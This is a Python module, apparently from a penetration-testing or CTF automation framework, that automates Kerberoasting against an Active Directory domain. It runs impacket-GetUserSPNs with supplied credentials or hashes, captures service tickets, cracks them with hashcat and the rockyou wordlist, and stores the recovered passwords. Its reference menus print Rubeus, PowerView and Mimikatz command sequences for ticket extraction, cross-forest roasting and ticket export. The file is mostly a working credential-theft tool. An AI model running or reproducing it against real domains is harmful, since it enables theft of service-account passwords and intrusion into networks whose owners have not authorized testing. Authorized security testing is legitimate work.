PROVIDES = ["creds"]
REQUIRES = []


def windows_kerberoast_reference():

    from core.paths import get_tools_dir
    from modules.upload.windows import stage_windows_files

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    W = '\033[0m'

    windows_tools = (
        get_tools_dir() /
        "windows"
    )

    print(
        f"\n{B}┌── WINDOWS KERBEROAST ──────────────┐{W}"
    )

    print(
        f"{B}│{W}  Select Method                {B}│{W}"
    )

    print(
        f"{B}└─────────────────────────────────┘{W}\n"
    )

    print(
        f"  {B}[1]{W} Rubeus"
    )

    print(
        f"  {B}[2]{W} PowerView"
    )

    print(
        f"  {B}[3]{W} Full Manual (Mimikatz)"
    )
    print(
        f"  {B}[4]{W} Cross-forest"
    )


    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    #
    # RUBEUS
    #

    if choice == "1":

        print(
            f"\n{B}[?]{W} Transfer Rubeus.exe?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        if input(
            f"{Y}Select> {W}"
        ).strip() == "1":

            stage_windows_files([
                windows_tools /
                "Rubeus.exe"
            ])

        print(
            f"\n{G}[+] {W}Rubeus\n"
        )

        print(
            f"{Y}Rubeus.exe kerberoast /stats{W}"
        )

        print()

        print(
            f"{Y}Rubeus.exe kerberoast /nowrap{W}"
        )

        print()

        print(
            f"{Y}Rubeus.exe kerberoast /user:{C}<user>{W} /nowrap"
        )

        print()

        print(
            f"{Y}Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap{W}"
        )

        print()

        print(
            f"{Y}Rubeus.exe kerberoast /tgtdeleg /nowrap{W}"
        )

        print()

        print(
            f"{Y}hashcat -m 13100 hash.txt $rockyou{W}"
        )


        print()

        return

    #
    # POWERVIEW
    #

    elif choice == "2":

        print(
            f"\n{B}[?]{W} Transfer PowerView.ps1?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        if input(
            f"{Y}Select> {W}"
        ).strip() == "1":

            stage_windows_files([
                windows_tools /
                "PowerView.ps1"
            ])

        print(
            f"\n{G}[+] {W}PowerView\n"
        )

        print(
            f"{Y}. .\\PowerView.ps1{W}"
        )

        print()

        print(
            f"{Y}Get-DomainUser * -SPN{W}"
        )

        print()
        print(f"{Y}Get-DomainUser -SPN | select samaccountname,serviceprincipalname{W}")
        print()
        print(f"{Y}Get-DomainUser -SPN | select samaccountname,memberof{W}")
        print()
        print(
            f"{Y}Get-DomainUser -Identity {C}<user>{W} | Get-DomainSPNTicket -Format Hashcat"
        )

        print()

        print(
            f"{Y}Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat{W}"
        )

        print()

        print(
            f"{Y}hashcat -m 13100 hash.txt $rockyou{W}"
        )


        return

    #
    # Cross-forest 
    #

    elif choice == "4":
        print()

        print(
            f"{G}[+] Cross-Forest Kerberoasting{W}\n"
        )

        print(
            f"{Y}Get-DomainUser "
            f"-SPN "
            f"-Domain {C}<foreign-domain>{W}"
        )

        print()

        print(
            f"{Y}Get-DomainUser "
            f"-Domain {C}<foreign-domain>{Y} "
            f"-Identity {C}<user>{Y} "
            f"| select samaccountname,memberof{W}"
        )

        print()

        print(
            f"{Y}Rubeus.exe kerberoast "
            f"/domain:{C}<foreign-domain>{Y} "
            f"/nowrap{W}"
        )

        print()

        print(
            f"{Y}Rubeus.exe kerberoast "
            f"/domain:{C}<foreign-domain>{Y} "
            f"/user:{C}<user>{Y} "
            f"/nowrap{W}"
        )

        print()

        print(
            f"{Y}hashcat -m 13100 kerberoast_hashes.txt $rockyou{W}"
        )

        print()

        print(
            f"{G}[+] Foreign Group Membership{W}\n"
        )

        print(
            f"{Y}Get-DomainForeignGroupMember{W}"
        )

        print()

        print(
            f"{Y}Get-DomainForeignGroupMember "
            f"-Domain {C}<foreign-domain>{W}"
        )

        print()

        print(
            f"{Y}Convert-SidToName {C}<SID>{W}"
        )

        print()
        

        return

    #
    # FULL MANUAL
    #

    elif choice == "3":

        print(
            f"\n{B}[?]{W} Transfer mimikatz.exe?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        if input(
            f"{Y}Select> {W}"
        ).strip() == "1":

            stage_windows_files([
                windows_tools /
                "mimikatz.exe"
            ])

        print(
            f"\n{G}[+] {W}Full Manual Kerberoasting\n"
        )

        print(
            f"{Y}setspn.exe -Q */*{W}"
        )

        print()

        print(
            f"{Y}Add-Type -AssemblyName System.IdentityModel{W}"
        )

        print()

        print(
            f"{Y}New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList {C}<SPN>{W}"
        )

        print()

        print(
            f"{Y}mimikatz{W}"
        )

        print(
            f"{Y}kerberos::list /export{W}"
        )
        print()
        print(
            f"{Y}ctf download.windows ticket.kirbi"
        )

        print()

        print(
            f"{Y}kirbi2john ticket.kirbi > hash.txt{W}"
        )

        print()

        print(
            f"{Y}hashcat -m 13100 hash.txt $rockyou{W}"
        )

        print()

        return


def run(
    data,
    cred,
    args
):

    from pathlib import Path
    from datetime import datetime
    import subprocess
    import argparse

    from core.paths import get_chain_artifacts_dir
    from core.target import target_add_cred
    from core.target import print_creds_table


    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    if getattr(args, "reference", False):
        target = data.get("ip")
        domain = data.get("domain")
        
        print(
            f"\n{G}[+] {W}Kerberoasting\n"
        )

        print(
            f"{Y}impacket-GetUserSPNs "
            f"{domain}/{cred['user']}:{cred['secret']} "
            f"-dc-ip {target} "
            f"-request{W}"
        )

        print()

        print(
            f"{Y}impacket-GetUserSPNs "
            f"{domain}/{cred['user']}:{cred['secret']} "
            f"-dc-ip {target} "
            f"-request "
            f"-outputfile kerberoast_hashes.txt{W}"
        )

        print()

        print(
            f"{Y}hashcat -m 13100 kerberoast_hashes.txt $rockyou{W}"
        )

        print()

        print(
            f"{G}[+] {W}Cross-Forest Kerberoasting\n"
        )

        print(
            f"{Y}impacket-GetUserSPNs "
            f"-target-domain {C}<target-domain>{Y} "
            f"{domain}/{cred['user']}:{cred['secret']} "
            f"-request{W}"
        )

        print()

        print(
            f"{Y}impacket-GetUserSPNs "
            f"-target-domain {C}<target-domain>{Y} "
            f"{domain}/{cred['user']}:{cred['secret']} "
            f"-request "
            f"-outputfile cross_forest_hashes.txt{W}"
        )

        print()

        print(
            f"{Y}hashcat -m 13100 cross_forest_hashes.txt $rockyou{W}"
        )

        print()
        return
    
    if getattr(
        args,
        "windows",
        False
    ):

        windows_kerberoast_reference()
        return

    if not cred:

        print(
            f"\n{R}[!] {W}Kerberoasting requires credentials\n"
        )

        return data

    target = data.get("ip")
    domain = data.get("domain")

    if not target or not domain:

        print(
            f"\n{R}[!] {W}Missing target/domain\n"
        )

        return data

    artifact_dir = get_chain_artifacts_dir(
        data["name"],
        "ad"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    hashes_file = (
        artifact_dir /
        "kerberoast_hashes.txt"
    )

    cracked_file = (
        artifact_dir /
        "kerberoast_cracked.txt"
    )

    logfile = (
        artifact_dir /
        f"kerberoast_{timestamp}.log"
    )

    user = cred["user"]
    secret = cred["secret"]
    cred_type = cred["type"]

    #
    # BUILD COMMAND
    #

    if cred_type == "password":

        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{user}:{secret}",
            "-dc-ip",
            target,
            "-request"
        ]

    elif cred_type == "ntlm":

        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{user}",
            "-hashes",
            f":{secret}",
            "-dc-ip",
            target,
            "-request"
        ]

    elif cred_type == "ticket":

        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/",
            "-dc-ip",
            target,
            "-request",
            "-k"
        ]

    else:

        print(
            f"\n{R}[!] {W}Unsupported credential type\n"
        )

        return data

    #
    # HUD
    #

    print(
        f"\n{B}┌── {BOLD}MODULE: KERBEROAST{W}{B} ────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Domain:{W} "
        f"{C}{domain:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}DC:{W}     "
        f"{C}{target:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└──────────────────────────────────────┘{W}"
    )

    #
    # ROAST
    #

    print(
        f"\n{B}[*]{W} Requesting Service Tickets\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    env = None

    if cred_type == "ticket":

        import os

        env = os.environ.copy()

        env["KRB5CCNAME"] = secret

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        env=env
    )

    logfile.write_text(
        result.stdout +
        result.stderr
    )

    hashes = []

    for line in result.stdout.splitlines():

        if "$krb5tgs$" not in line:
            continue

        hashes.append(
            line.strip()
        )

    if not hashes:

        print(
            f"\n{Y}[-]{W} No Kerberoastable accounts found\n"
        )

        return data

    hashes_file.write_text(
        "\n".join(hashes)
    )

    print(
        f"\n{G}[+] {W}"
        f"Captured {len(hashes)} ticket(s)\n"
    )

    #
    # CRACK
    #

    rockyou = Path(
        "/usr/share/wordlists/rockyou.txt"
    )

    if rockyou.exists():

        print(
            f"{B}[*]{W} Cracking with rockyou.txt\n"
        )

        crack_cmd = [
            "hashcat",
            "-m",
            "13100",
            str(hashes_file),
            str(rockyou),
            "--quiet",
            "--outfile",
            str(cracked_file)
        ]

        subprocess.run(
            crack_cmd
        )

    #
    # PARSE CRACKED
    #

    recovered = []
    seen = set()

    if cracked_file.exists():

        for line in cracked_file.read_text(
            errors="ignore"
        ).splitlines():

            try:

                hash_part, password = (
                    line.rsplit(
                        ":",
                        1
                    )
                )

                #
                # backupagent from:
                # $krb5tgs$23$*backupagent$DOMAIN$...
                #

                username = (
                    hash_part.split(
                        "$"
                    )[3]
                    .lstrip("*")
                )

                key = (
                    username.lower(),
                    password
                )

                if key in seen:
                    continue

                seen.add(
                    key
                )

                recovered.append({
                    "user": username,
                    "secret": password
                })

            except Exception:

                pass

    #
    # IMPORT CREDS
    #

    if recovered:

        print(
            f"\n{G}[+] {W}Cracked Credentials\n"
        )

        for c in recovered:

            print(
                f"  {B}├──{W} "
                f"{C}{c['user']}{W}:"
                f"{Y}{c['secret']}{W}"
            )

            target_add_cred(
                argparse.Namespace(
                    user=c["user"],
                    password=c["secret"],
                    hash=None,
                    aes=None,
                    ccache=None
                ),
                switch=False, show=False
            )
        print_creds_table()
    #
    # OUTPUT
    #

    print()

    print(
        f"{G}[+] {W}Artifacts"
    )

    print(
        f"{B}  ├── {C}{hashes_file}{W}"
    )

    print(
        f"{B}  ├── {C}{cracked_file}{W}"
    )

    print(
        f"{B}  └── {C}{logfile}{W}\n"
    )

    return data
